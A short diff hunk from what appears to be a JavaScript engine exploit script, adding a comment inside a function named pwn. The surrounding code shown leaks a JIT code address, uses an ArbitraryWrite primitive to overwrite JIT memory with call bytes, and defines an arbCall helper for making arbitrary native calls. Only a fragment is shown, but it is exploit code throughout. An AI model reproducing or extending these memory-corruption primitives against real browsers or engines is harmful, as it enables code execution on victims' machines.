@@ -386,6 +386,7 @@ function pwn() {
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
     ArbitraryWrite(JITCode, arbCallBytes);
     
+    // function to make an arbitrary call
     function arbCall(func, ...args) {
         if (args.length > 9) {
             log("[+] Only 9 args are allowed!\n");
